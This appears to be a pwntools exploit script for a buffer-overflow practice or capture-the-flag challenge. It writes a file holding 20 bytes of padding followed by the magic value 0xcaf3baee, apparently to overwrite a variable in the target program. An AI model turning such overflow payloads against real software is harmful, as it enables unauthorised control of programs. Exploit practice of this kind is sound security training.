from pwn import *

payload = b""
payload += b"0"*0x14
payload += p32(0xcaf3baee)

out_file = open("input", "wb")
out_file.write(payload)
out_file.close()

